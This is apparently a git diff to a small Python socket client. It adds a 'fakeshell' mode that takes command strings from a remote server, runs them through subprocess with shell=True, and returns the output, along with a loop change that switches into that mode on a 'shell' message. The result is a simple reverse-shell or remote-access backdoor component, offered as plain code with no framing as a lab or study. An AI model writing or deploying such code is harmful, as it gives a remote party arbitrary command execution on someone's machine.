@@ -1,5 +1,7 @@
 import os
 import socket
+import subprocess
+import time
 
 
 class Client:
@@ -14,22 +16,47 @@ class Client:
     def connectToServer(self):
         self.client.connect((self.SERVER_IP, self.PORT))
 
-    def reciept(self):
-        while True:
-            message = self.client.recv(self.BUFFER_SIZE).decode()
-            print("Server:", message)
-            # self.send(output.encode())
-            self.client.send("[+] Message displayed and closed.".encode("utf-8"))
+    def txtmsg(self):
+        print("waiting")
+        message = self.client.recv(self.BUFFER_SIZE).decode()
+        print("Server:", message)
+        # self.send(output.encode())
+        # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
+        time.sleep(2)
+        self.client.send("[+] Message displayed and closed.".encode("utf-8"))
+
+    def fakeshell(self):
+        """ Shell """
+
+        print("SHELL MODE ENABLED: ")
+        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
+
+        obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                               shell=True)
+        output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
+
+        if output == "" or output == "\n":
+            self.client.send("[*] Done".encode("utf-8"))
+        else:
+            self.client.send(output.encode("utf-8"))
 
     def endless(self):
         while True:
-
-            msg = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
+            print("entered loop")
+            msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
+            print("message received {msg}")
             if msg == "msg":
+
                 # self.msg()
-                 print("This is where it reached")
+                print("This is where it reached")
+                self.txtmsg()
+                print("This is where it reached")
+                time.sleep(3)
+            elif msg == "shell":
+                self.fakeshell()
             else:
-                print("msg = " + msg)
+                print("Server: msg = " + msg)
+                self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
 
 def main():
